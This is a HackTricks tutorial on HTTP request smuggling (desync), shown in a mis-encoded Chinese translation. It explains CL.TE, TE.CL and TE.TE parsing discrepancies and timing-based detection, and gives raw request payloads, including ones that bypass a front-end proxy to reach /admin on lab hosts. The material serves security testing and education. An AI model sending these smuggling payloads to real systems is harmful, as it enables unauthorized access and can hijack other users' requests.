# HTTP è¯·æ±‚ä¸²è¡Œæ”»å‡» / HTTP Desync æ”»å‡»

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ä»€ä¹ˆæ˜¯

å½“**å‰ç«¯ä»£ç†**å’Œ**åç«¯**æœåŠ¡å™¨ä¹‹é—´å‘ç”Ÿ**ä¸åŒæ­¥**æ—¶ï¼Œä¼šå‡ºç°æ­¤æ¼æ´ï¼Œä½¿å¾—**æ”»å‡»è€…**èƒ½å¤Ÿå‘é€ä¸€ä¸ª HTTP **è¯·æ±‚**ï¼Œåœ¨**å‰ç«¯**ä»£ç†ï¼ˆè´Ÿè½½å‡è¡¡/åå‘ä»£ç†ï¼‰ä¸­è¢«è§£é‡Šä¸º**å•ä¸ªè¯·æ±‚**ï¼Œè€Œåœ¨**åç«¯**æœåŠ¡å™¨ä¸­è¢«è§£é‡Šä¸º**2ä¸ªè¯·æ±‚**ã€‚\
è¿™ä½¿å¾—ç”¨æˆ·èƒ½å¤Ÿåœ¨**åç«¯**æœåŠ¡å™¨æ¥æ”¶åˆ°ä»–ä¹‹åçš„**ä¸‹ä¸€ä¸ªè¯·æ±‚**ä¹‹å‰**ä¿®æ”¹**è¯·æ±‚ã€‚

### ç†è®º

[**RFC è§„èŒƒï¼ˆ2161ï¼‰**](https://tools.ietf.org/html/rfc2616)

> å¦‚æœæ¥æ”¶åˆ°åŒæ—¶å…·æœ‰ä¼ è¾“ç¼–ç å¤´å­—æ®µå’Œå†…å®¹é•¿åº¦å¤´å­—æ®µçš„æ¶ˆæ¯ï¼Œåˆ™å¿…é¡»å¿½ç•¥åè€…ã€‚

**Content-Length**

> Content-Length å®ä½“å¤´æŒ‡ç¤ºå‘é€ç»™æ¥æ”¶æ–¹çš„å®ä½“ä¸»ä½“çš„å­—èŠ‚æ•°ã€‚

**Transfer-Encoding: chunked**

> Transfer-Encoding å¤´æŒ‡å®šç”¨äºå®‰å…¨ä¼ è¾“æœ‰æ•ˆè½½è·ä¸»ä½“çš„ç¼–ç å½¢å¼ã€‚\
> Chunked æ„å‘³ç€å¤§æ•°æ®ä»¥ä¸€ç³»åˆ—å—çš„å½¢å¼å‘é€

### ç°å®æƒ…å†µ

**å‰ç«¯**ï¼ˆè´Ÿè½½å‡è¡¡ / åå‘ä»£ç†ï¼‰å¤„ç† _**content-length**_ æˆ– _**transfer-encoding**_ å¤´ï¼Œè€Œ**åç«¯**æœåŠ¡å™¨å¤„ç†å¦ä¸€ä¸ªå¤´ï¼Œå¯¼è‡´è¿™ä¸¤ä¸ªç³»ç»Ÿä¹‹é—´çš„**ä¸åŒæ­¥**ã€‚\
è¿™å¯èƒ½éå¸¸å±é™©ï¼Œå› ä¸º**æ”»å‡»è€…å°†èƒ½å¤Ÿå‘åå‘ä»£ç†å‘é€ä¸€ä¸ªè¯·æ±‚**ï¼Œè¯¥è¯·æ±‚å°†è¢«**å‰ç«¯**æœåŠ¡å™¨æ ¹æ®**content-length**å€¼**è§£é‡Šä¸ºæ•´ä¸ªè¯·æ±‚**ï¼Œè€Œ**åç«¯**æœåŠ¡å™¨åˆ™ä¼šæ ¹æ®**transfer-encoding: chunked**å¤´å°†è¯·æ±‚**è§£é‡Šä¸º2ä¸ªä¸åŒçš„è¯·æ±‚**ã€‚è¿™ç§æŠ€æœ¯çš„å±é™©åœ¨äº**åç«¯**æœåŠ¡å™¨å°†**è§£é‡Šæ³¨å…¥çš„ç¬¬äºŒä¸ªè¯·æ±‚**ï¼Œå°±å¥½åƒå®ƒ**æ¥è‡ªä¸‹ä¸€ä¸ªå®¢æˆ·ç«¯**ï¼Œè€Œè¯¥å®¢æˆ·ç«¯çš„**çœŸå®è¯·æ±‚**å°†æˆä¸º**æ³¨å…¥è¯·æ±‚**çš„ä¸€éƒ¨åˆ†ã€‚

### ç‰¹æ®Šæƒ…å†µ

è¯·è®°ä½ï¼Œåœ¨ HTTP ä¸­ï¼Œ**ä¸€ä¸ªæ–°è¡Œå­—ç¬¦ç”± 2 ä¸ªå­—èŠ‚ç»„æˆ**ï¼š

* **Content-Length**ï¼šæ­¤å¤´ä½¿ç”¨**åè¿›åˆ¶æ•°**è¡¨ç¤ºè¯·æ±‚ä¸»ä½“çš„**å­—èŠ‚æ•°**ã€‚é¢„æœŸè¯·æ±‚ä¸»ä½“åœ¨æœ€åä¸€ä¸ªå­—ç¬¦ç»“æŸï¼Œ**åœ¨è¯·æ±‚æœ«å°¾ä¸éœ€è¦æ–°è¡Œ**ã€‚
* **Transfer-Encoding:**ï¼šæ­¤å¤´åœ¨**ä¸»ä½“**ä¸­ä½¿ç”¨**åå…­è¿›åˆ¶æ•°**è¡¨ç¤º**ä¸‹ä¸€ä¸ªå—**çš„**å­—èŠ‚æ•°**ã€‚**å—**å¿…é¡»ä»¥**æ–°è¡Œ**ç»“å°¾ï¼Œä½†æ­¤æ–°è¡Œ**ä¸è®¡å…¥**é•¿åº¦æŒ‡ç¤ºç¬¦ã€‚æ­¤ä¼ è¾“æ–¹æ³•å¿…é¡»ä»¥**å¤§å°ä¸º 0 çš„å—åè·Ÿ 2 ä¸ªæ–°è¡Œ**ç»“æŸï¼š`0`
* **Connection**ï¼šæ ¹æ®æˆ‘çš„ç»éªŒï¼Œå»ºè®®åœ¨è¯·æ±‚ä¸²è¡Œçš„ç¬¬ä¸€ä¸ªè¯·æ±‚ä¸­ä½¿ç”¨**`Connection: keep-alive`**ã€‚

## åŸºæœ¬ç¤ºä¾‹

HTTP è¯·æ±‚ä¸²è¡Œæ”»å‡»æ˜¯é€šè¿‡å‘é€æ¨¡ç³Šè¯·æ±‚æ¥åˆ©ç”¨å‰ç«¯å’Œåç«¯æœåŠ¡å™¨è§£é‡Š `Content-Length`ï¼ˆCLï¼‰å’Œ `Transfer-Encoding`ï¼ˆTEï¼‰å¤´çš„å·®å¼‚è€Œåˆ¶ä½œçš„ã€‚è¿™äº›æ”»å‡»å¯ä»¥ä»¥ä¸åŒå½¢å¼å‡ºç°ï¼Œä¸»è¦ä¸º **CL.TE**ã€**TE.CL** å’Œ **TE.TE**ã€‚æ¯ç§ç±»å‹ä»£è¡¨å‰ç«¯å’Œåç«¯æœåŠ¡å™¨å¦‚ä½•ä¼˜å…ˆå¤„ç†è¿™äº›å¤´çš„ç‹¬ç‰¹ç»„åˆã€‚æ¼æ´æºäºæœåŠ¡å™¨ä»¥ä¸åŒæ–¹å¼å¤„ç†åŒä¸€è¯·æ±‚ï¼Œå¯¼è‡´æ„å¤–ä¸”å¯èƒ½æ¶æ„çš„ç»“æœã€‚

### æ¼æ´ç±»å‹çš„åŸºæœ¬ç¤ºä¾‹

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE æ¼æ´ï¼ˆå‰ç«¯ä½¿ç”¨ Content-Lengthï¼Œåç«¯ä½¿ç”¨ Transfer-Encodingï¼‰
- **å‰ç«¯ï¼ˆCLï¼‰**ï¼šæ ¹æ® `Content-Length` å¤´å¤„ç†è¯·æ±‚ã€‚
- **åç«¯ï¼ˆTEï¼‰**ï¼šæ ¹æ® `Transfer-Encoding` å¤´å¤„ç†è¯·æ±‚ã€‚
- **æ”»å‡»åœºæ™¯ï¼š**
- æ”»å‡»è€…å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå…¶ä¸­ `Content-Length` å¤´çš„å€¼ä¸å®é™…å†…å®¹é•¿åº¦ä¸åŒ¹é…ã€‚
- å‰ç«¯æœåŠ¡å™¨æ ¹æ® `Content-Length` å€¼å°†æ•´ä¸ªè¯·æ±‚è½¬å‘åˆ°åç«¯ã€‚
- åç«¯æœåŠ¡å™¨ç”±äº `Transfer-Encoding: chunked` å¤´å¤„ç†è¯·æ±‚ä¸ºåˆ†å—ï¼Œå°†å‰©ä½™æ•°æ®è§£é‡Šä¸ºä¸€ä¸ªå•ç‹¬çš„åç»­è¯·æ±‚ã€‚
- **ç¤ºä¾‹ï¼š**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL æ¼æ´ï¼ˆå‰ç«¯ä½¿ç”¨ Transfer-Encodingï¼Œåç«¯ä½¿ç”¨ Content-Lengthï¼‰
- **å‰ç«¯ï¼ˆTEï¼‰**ï¼šæ ¹æ® `Transfer-Encoding` å¤´å¤„ç†è¯·æ±‚ã€‚
- **åç«¯ï¼ˆCLï¼‰**ï¼šæ ¹æ® `Content-Length` å¤´å¤„ç†è¯·æ±‚ã€‚
- **æ”»å‡»åœºæ™¯ï¼š**
- æ”»å‡»è€…å‘é€ä¸€ä¸ªåˆ†å—è¯·æ±‚ï¼Œå…¶ä¸­å—å¤§å°ï¼ˆ`7b`ï¼‰å’Œå®é™…å†…å®¹é•¿åº¦ï¼ˆ`Content-Length: 4`ï¼‰ä¸å¯¹é½ã€‚
- å‰ç«¯æœåŠ¡å™¨æ ¹æ® `Transfer-Encoding` è½¬å‘æ•´ä¸ªè¯·æ±‚åˆ°åç«¯ã€‚
- åç«¯æœåŠ¡å™¨æ ¹æ® `Content-Length` å¤„ç†è¯·æ±‚ï¼Œä»…å¤„ç†è¯·æ±‚çš„åˆå§‹éƒ¨åˆ†ï¼ˆ`7b` å­—èŠ‚ï¼‰ï¼Œå°†å…¶ä½™éƒ¨åˆ†ç•™ä½œæ„å¤–çš„åç»­è¯·æ±‚çš„ä¸€éƒ¨åˆ†ã€‚
- **ç¤ºä¾‹ï¼š**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE æ¼æ´ï¼ˆä¸¤è€…éƒ½ä½¿ç”¨ Transfer-Encodingï¼Œé€šè¿‡æ··æ·†ï¼‰
- **æœåŠ¡å™¨ï¼š** ä¸¤è€…éƒ½æ”¯æŒ `Transfer-Encoding`ï¼Œä½†å¯ä»¥é€šè¿‡æ··æ·†ä½¿å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨æ— æ³•è¯†åˆ«ã€‚
- **æ”»å‡»åœºæ™¯ï¼š**
- æ”»å‡»è€…å‘é€ä¸€ä¸ªå¸¦æœ‰æ··æ·†çš„ `Transfer-Encoding` å¤´çš„è¯·æ±‚ã€‚
- å–å†³äºå“ªä¸ªæœåŠ¡å™¨ï¼ˆå‰ç«¯æˆ–åç«¯ï¼‰æ— æ³•è¯†åˆ«æ··æ·†ï¼Œå¯èƒ½ä¼šåˆ©ç”¨ CL.TE æˆ– TE.CL æ¼æ´ã€‚
- ç”±å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨çœ‹åˆ°çš„è¯·æ±‚çš„æœªå¤„ç†éƒ¨åˆ†å°†æˆä¸ºåç»­è¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œå¯¼è‡´ä¸²è¡Œæ”»å‡»ã€‚
- **ç¤ºä¾‹ï¼š**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL åœºæ™¯ï¼ˆå‰ç«¯å’Œåç«¯éƒ½ä½¿ç”¨ Content-Lengthï¼‰ï¼š**
- ä¸¤ä¸ªæœåŠ¡å™¨ä»…æ ¹æ® `Content-Length` å¤´å¤„ç†è¯·æ±‚ã€‚
- é€šå¸¸ï¼Œæ­¤åœºæ™¯ä¸ä¼šå¯¼è‡´ä¸²è¡Œæ”»å‡»ï¼Œå› ä¸ºä¸¤ä¸ªæœåŠ¡å™¨åœ¨è§£é‡Šè¯·æ±‚é•¿åº¦æ–¹é¢æ˜¯ä¸€è‡´çš„ã€‚
- **ç¤ºä¾‹ï¼š**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

æ­£å¸¸è¯·æ±‚
```

#### **CL != 0 åœºæ™¯ï¼š**
- æŒ‡çš„æ˜¯ `Content-Length` å¤´å­˜åœ¨ä¸”å€¼ä¸ä¸ºé›¶ï¼Œè¡¨ç¤ºè¯·æ±‚ä¸»ä½“å…·æœ‰å†…å®¹çš„æƒ…å†µã€‚
- è¿™å¯¹äºç†è§£å’Œåˆ¶ä½œä¸²è¡Œæ”»å‡»è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒå½±å“æœåŠ¡å™¨å¦‚ä½•ç¡®å®šè¯·æ±‚çš„ç»“æŸã€‚
- **ç¤ºä¾‹ï¼š**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

éç©ºä¸»ä½“
```

#### é€šè¿‡é€è·³å¤´å¼ºåˆ¶

æ»¥ç”¨é€è·³å¤´ï¼Œæ‚¨å¯ä»¥æŒ‡ç¤ºä»£ç†**åˆ é™¤ Content-Length æˆ– Transfer-Encoding å¤´**ï¼Œä»è€Œå¯èƒ½æ»¥ç”¨ HTTP è¯·æ±‚ä¸²è¡Œæ”»å‡»ã€‚
```
Connection: Content-Length
```
æœ‰å…³**é€è·³å¤´ä¿¡æ¯**çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®ï¼š

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}


## æŸ¥æ‰¾HTTPè¯·æ±‚èµ°ç§

é€šå¸¸å¯ä»¥ä½¿ç”¨æ—¶é—´æŠ€æœ¯æ¥è¯†åˆ«HTTPè¯·æ±‚èµ°ç§æ¼æ´ï¼Œè¿™äº›æŠ€æœ¯ä¾èµ–äºè§‚å¯ŸæœåŠ¡å™¨å¯¹æ“çºµè¯·æ±‚çš„å“åº”æ—¶é—´ã€‚è¿™äº›æŠ€æœ¯ç‰¹åˆ«é€‚ç”¨äºæ£€æµ‹CL.TEå’ŒTE.CLæ¼æ´ã€‚é™¤äº†è¿™äº›æ–¹æ³•ï¼Œè¿˜æœ‰å…¶ä»–ç­–ç•¥å’Œå·¥å…·å¯ç”¨äºæŸ¥æ‰¾æ­¤ç±»æ¼æ´ï¼š

### ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾CL.TEæ¼æ´
- **æ–¹æ³•:**
- å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ï¼Œå°†å¯¼è‡´åç«¯æœåŠ¡å™¨ç­‰å¾…é¢å¤–æ•°æ®ã€‚
- **ç¤ºä¾‹:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **è§‚å¯Ÿ:**
- å‰ç«¯æœåŠ¡å™¨æ ¹æ®`Content-Length`å¤„ç†è¯·æ±‚å¹¶è¿‡æ—©æˆªæ–­æ¶ˆæ¯ã€‚
- åç«¯æœåŠ¡å™¨æœŸæœ›æ”¶åˆ°ä¸€ä¸ªåˆ†å—æ¶ˆæ¯ï¼Œç­‰å¾…ä¸‹ä¸€ä¸ªä»æœªåˆ°è¾¾çš„åˆ†å—ï¼Œå¯¼è‡´å»¶è¿Ÿã€‚

- **æŒ‡æ ‡:**
- å“åº”è¶…æ—¶æˆ–é•¿æ—¶é—´å»¶è¿Ÿã€‚
- ä»åç«¯æœåŠ¡å™¨æ”¶åˆ°400 Bad Requesté”™è¯¯ï¼Œæœ‰æ—¶åŒ…å«è¯¦ç»†çš„æœåŠ¡å™¨ä¿¡æ¯ã€‚

### ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾TE.CLæ¼æ´
- **æ–¹æ³•:**
- å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ï¼Œå°†å¯¼è‡´åç«¯æœåŠ¡å™¨ç­‰å¾…é¢å¤–æ•°æ®ã€‚
- **ç¤ºä¾‹:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **è§‚å¯Ÿ:**
- å‰ç«¯æœåŠ¡å™¨æ ¹æ®`Transfer-Encoding`å¤„ç†è¯·æ±‚å¹¶è½¬å‘æ•´ä¸ªæ¶ˆæ¯ã€‚
- åç«¯æœåŠ¡å™¨æœŸæœ›æ ¹æ®`Content-Length`æ¥æ”¶æ¶ˆæ¯ï¼Œç­‰å¾…ä»æœªåˆ°è¾¾çš„é¢å¤–æ•°æ®ï¼Œå¯¼è‡´å»¶è¿Ÿã€‚

### æŸ¥æ‰¾æ¼æ´çš„å…¶ä»–æ–¹æ³•
- **å·®å¼‚å“åº”åˆ†æ:**
- å‘é€ç•¥æœ‰å˜åŒ–çš„è¯·æ±‚ç‰ˆæœ¬ï¼Œå¹¶è§‚å¯ŸæœåŠ¡å™¨å“åº”æ˜¯å¦ä»¥æ„å¤–æ–¹å¼ä¸åŒï¼ŒæŒ‡ç¤ºè§£æå·®å¼‚ã€‚

- **ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·:**
- åƒBurp Suiteçš„'HTTP Request Smuggler'æ‰©å±•è¿™æ ·çš„å·¥å…·å¯ä»¥é€šè¿‡å‘é€å„ç§æ¨¡ç³Šè¯·æ±‚å¹¶åˆ†æå“åº”æ¥è‡ªåŠ¨æµ‹è¯•è¿™äº›æ¼æ´ã€‚

- **Content-Lengthå˜åŒ–æµ‹è¯•:**
- å‘é€å…·æœ‰ä¸ä¸å®é™…å†…å®¹é•¿åº¦å¯¹é½çš„ä¸åŒ`Content-Length`å€¼çš„è¯·æ±‚ï¼Œå¹¶è§‚å¯ŸæœåŠ¡å™¨å¦‚ä½•å¤„ç†è¿™ç§ä¸åŒ¹é…ã€‚

- **Transfer-Encodingå˜åŒ–æµ‹è¯•:**
- å‘é€å…·æœ‰æ··æ·†æˆ–æ ¼å¼é”™è¯¯çš„`Transfer-Encoding`å¤´çš„è¯·æ±‚ï¼Œå¹¶ç›‘è§†å‰ç«¯å’Œåç«¯æœåŠ¡å™¨å¯¹è¿™ç§æ“çºµçš„ä¸åŒå“åº”ã€‚

### HTTPè¯·æ±‚èµ°ç§æ¼æ´æµ‹è¯•

åœ¨ç¡®è®¤æ—¶é—´æŠ€æœ¯çš„æœ‰æ•ˆæ€§åï¼ŒéªŒè¯å®¢æˆ·ç«¯è¯·æ±‚æ˜¯å¦å¯è¢«æ“çºµè‡³å…³é‡è¦ã€‚ä¸€ç§ç®€å•çš„æ–¹æ³•æ˜¯å°è¯•æ“çºµæ‚¨çš„è¯·æ±‚ï¼Œä¾‹å¦‚ï¼Œä½¿å¯¹`/`çš„è¯·æ±‚äº§ç”Ÿ404å“åº”ã€‚åœ¨[åŸºæœ¬ç¤ºä¾‹](./#basic-examples)ä¸­å…ˆå‰è®¨è®ºçš„`CL.TE`å’Œ`TE.CL`ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•æ“çºµå®¢æˆ·ç«¯è¯·æ±‚ä»¥å¼•å‘404å“åº”ï¼Œå°½ç®¡å®¢æˆ·ç«¯çš„ç›®æ ‡æ˜¯è®¿é—®ä¸åŒçš„èµ„æºã€‚

**å…³é”®è€ƒè™‘äº‹é¡¹**

åœ¨é€šè¿‡å¹²æ‰°å…¶ä»–è¯·æ±‚æµ‹è¯•è¯·æ±‚èµ°ç§æ¼æ´æ—¶ï¼Œè¯·è®°ä½ï¼š

* **ä¸åŒçš„ç½‘ç»œè¿æ¥:** â€œæ”»å‡»â€å’Œâ€œæ­£å¸¸â€è¯·æ±‚åº”é€šè¿‡ä¸åŒçš„ç½‘ç»œè¿æ¥å‘é€ã€‚åœ¨ä¸¤è€…ä¸Šä½¿ç”¨ç›¸åŒè¿æ¥ä¸ä¼šéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚
* **ä¸€è‡´çš„URLå’Œå‚æ•°:** åŠ¡å¿…ä¸ºä¸¤ä¸ªè¯·æ±‚ä½¿ç”¨ç›¸åŒçš„URLå’Œå‚æ•°åç§°ã€‚ç°ä»£åº”ç”¨ç¨‹åºé€šå¸¸æ ¹æ®URLå’Œå‚æ•°å°†è¯·æ±‚è·¯ç”±åˆ°ç‰¹å®šçš„åç«¯æœåŠ¡å™¨ã€‚åŒ¹é…è¿™äº›å†…å®¹å¢åŠ äº†ä¸¤ä¸ªè¯·æ±‚ç”±åŒä¸€æœåŠ¡å™¨å¤„ç†çš„å¯èƒ½æ€§ï¼Œè¿™æ˜¯æˆåŠŸæ”»å‡»çš„å…ˆå†³æ¡ä»¶ã€‚
* **æ—¶é—´å’Œç«äº‰æ¡ä»¶:** â€œæ­£å¸¸â€è¯·æ±‚æ—¨åœ¨æ£€æµ‹æ¥è‡ªâ€œæ”»å‡»â€è¯·æ±‚çš„å¹²æ‰°ï¼Œä¸å…¶ä»–å¹¶å‘åº”ç”¨ç¨‹åºè¯·æ±‚ç«äº‰ã€‚å› æ­¤ï¼Œåº”ç«‹å³åœ¨â€œæ”»å‡»â€è¯·æ±‚ä¹‹åå‘é€â€œæ­£å¸¸â€è¯·æ±‚ã€‚ç¹å¿™çš„åº”ç”¨ç¨‹åºå¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•æ‰èƒ½å¾—å‡ºç»“è®ºæ€§çš„æ¼æ´ç¡®è®¤ã€‚
* **è´Ÿè½½å‡è¡¡æŒ‘æˆ˜:** å……å½“è´Ÿè½½å‡è¡¡å™¨çš„å‰ç«¯æœåŠ¡å™¨å¯èƒ½ä¼šå°†è¯·æ±‚åˆ†å‘åˆ°ä¸åŒçš„åç«¯ç³»ç»Ÿã€‚å¦‚æœâ€œæ”»å‡»â€å’Œâ€œæ­£å¸¸â€è¯·æ±‚æœ€ç»ˆè¿›å…¥ä¸åŒçš„ç³»ç»Ÿï¼Œæ”»å‡»å°†ä¸ä¼šæˆåŠŸã€‚è¿™ç§è´Ÿè½½å‡è¡¡æ–¹é¢å¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•æ‰èƒ½ç¡®è®¤æ¼æ´ã€‚
* **æ„å¤–ç”¨æˆ·å½±å“:** å¦‚æœæ‚¨çš„æ”»å‡»æ„å¤–å½±å“äº†å¦ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚ï¼ˆè€Œä¸æ˜¯æ‚¨å‘é€ç”¨äºæ£€æµ‹çš„â€œæ­£å¸¸â€è¯·æ±‚ï¼‰ï¼Œè¿™è¡¨æ˜æ‚¨çš„æ”»å‡»å½±å“äº†å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºç”¨æˆ·ã€‚æŒç»­æµ‹è¯•å¯èƒ½ä¼šå¹²æ‰°å…¶ä»–ç”¨æˆ·ï¼Œéœ€è¦è°¨æ…å¤„ç†ã€‚


## æ»¥ç”¨HTTPè¯·æ±‚èµ°ç§

### ç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶

### é€šè¿‡HTTPè¯·æ±‚èµ°ç§ç»•è¿‡å‰ç«¯å®‰å…¨

æœ‰æ—¶ï¼Œå‰ç«¯ä»£ç†å®æ–½å®‰å…¨æªæ–½ï¼Œå®¡æŸ¥ä¼ å…¥è¯·æ±‚ã€‚ç„¶è€Œï¼Œé€šè¿‡åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§ï¼Œå¯ä»¥ç»•è¿‡è¿™äº›æªæ–½ï¼Œä»è€Œæœªç»æˆæƒåœ°è®¿é—®å—é™ç«¯ç‚¹ã€‚ä¾‹å¦‚ï¼Œå¤–éƒ¨å¯èƒ½ç¦æ­¢è®¿é—®`/admin`ï¼Œå‰ç«¯ä»£ç†ä¼šä¸»åŠ¨é˜»æ­¢æ­¤ç±»å°è¯•ã€‚ç„¶è€Œï¼Œè¯¥ä»£ç†å¯èƒ½å¿½ç•¥äº†èµ°ç§HTTPè¯·æ±‚ä¸­åµŒå…¥çš„è¯·æ±‚ï¼Œä¸ºç»•è¿‡è¿™äº›é™åˆ¶ç•™ä¸‹äº†æ¼æ´ã€‚

è€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼Œè¯´æ˜å¦‚ä½•ä½¿ç”¨HTTPè¯·æ±‚èµ°ç§ç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶ï¼Œç‰¹åˆ«æ˜¯é’ˆå¯¹é€šå¸¸ç”±å‰ç«¯ä»£ç†ä¿æŠ¤çš„`/admin`è·¯å¾„ï¼š

**CL.TEç¤ºä¾‹**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
åœ¨ CL.TE æ”»å‡»ä¸­ï¼Œåˆ©ç”¨ `Content-Length` å¤´éƒ¨è¿›è¡Œåˆå§‹è¯·æ±‚ï¼Œè€Œåç»­åµŒå…¥çš„è¯·æ±‚åˆ©ç”¨ `Transfer-Encoding: chunked` å¤´éƒ¨ã€‚å‰ç«¯ä»£ç†å¤„ç†åˆå§‹çš„ `POST` è¯·æ±‚ï¼Œä½†æœªæ£€æŸ¥åµŒå…¥çš„ `GET /admin` è¯·æ±‚ï¼Œä»è€Œå…è®¸æœªç»æˆæƒè®¿é—® `/admin` è·¯å¾„ã€‚

**TE.CL ç¤ºä¾‹**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
ç›¸åï¼Œåœ¨TE.CLæ”»å‡»ä¸­ï¼Œåˆå§‹çš„`POST`è¯·æ±‚ä½¿ç”¨`Transfer-Encoding: chunked`ï¼Œè€Œåç»­åµŒå…¥çš„è¯·æ±‚åˆ™åŸºäº`Content-Length`å¤´è¿›è¡Œå¤„ç†ã€‚ä¸CL.TEæ”»å‡»ç±»ä¼¼ï¼Œå‰ç«¯ä»£ç†å¿½ç•¥äº†æºå¸¦çš„`GET /admin`è¯·æ±‚ï¼Œæ— æ„ä¸­æˆäºˆå¯¹å—é™`/admin`è·¯å¾„çš„è®¿é—®æƒé™ã€‚

### æ­ç¤ºå‰ç«¯è¯·æ±‚é‡å†™ <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

åº”ç”¨ç¨‹åºé€šå¸¸ä½¿ç”¨**å‰ç«¯æœåŠ¡å™¨**åœ¨å°†è¯·æ±‚ä¼ é€’ç»™åç«¯æœåŠ¡å™¨ä¹‹å‰ä¿®æ”¹ä¼ å…¥è¯·æ±‚ã€‚å…¸å‹çš„ä¿®æ”¹åŒ…æ‹¬æ·»åŠ å¤´éƒ¨ï¼Œä¾‹å¦‚`X-Forwarded-For: <å®¢æˆ·ç«¯çš„IP>`ï¼Œä»¥å°†å®¢æˆ·ç«¯çš„IPä¼ é€’ç»™åç«¯ã€‚äº†è§£è¿™äº›ä¿®æ”¹å¯èƒ½è‡³å…³é‡è¦ï¼Œå› ä¸ºè¿™å¯èƒ½æ­ç¤ºç»•è¿‡ä¿æŠ¤æªæ–½æˆ–æ­ç¤ºéšè—ä¿¡æ¯æˆ–ç«¯ç‚¹çš„æ–¹æ³•ã€‚

